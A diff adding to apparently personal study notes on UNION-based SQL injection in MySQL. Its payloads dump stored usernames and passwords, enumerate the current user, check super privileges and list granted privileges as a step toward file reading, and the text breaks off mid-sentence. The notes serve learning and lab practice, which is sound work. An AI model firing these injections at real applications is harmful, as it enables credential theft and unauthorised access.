@@ -108,4 +108,38 @@ cn' UNION select 1, username, password, 4 from dev.credentials-- -
 
 Reading Files:
 
-To read files in MySQL, one would need FILE Privilege in order to do so, below is how to gather data to determine if one have enough 
+To read files in MySQL, one would need FILE Privilege in order to do so, below is how to gather data to determine if one have enough privilege in doing so:
+
+The following queries query the current user:
+```
+SELECT USER()
+SELECT CURRENT_USER()
+SELECT user from mysql.user
+```
+
+therefore, continuing our previous context, the union execution becomes:
+```
+cn' UNION SELECT 1, user(), 3, 4-- -
+```
+or
+```
+cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
+```
+
+Then, we need to check if we have the super admin privileges, which can be found by following query:
+```
+SELECT super_priv FROM mysql.user WHERE user="<currentuser>"
+```
+
+Therefore, when used in union, it becomes:
+```
+cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="<currentuser>"-- -
+```
+
+We can dump all of our owned privilege by using the following query:
+```
+cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'<currentuser>'@'localhost'"-- -
+#if we dont have that many column, grantee can be discarded and left only privilege_type
+```
+
+If enough privilege is provided, then we 
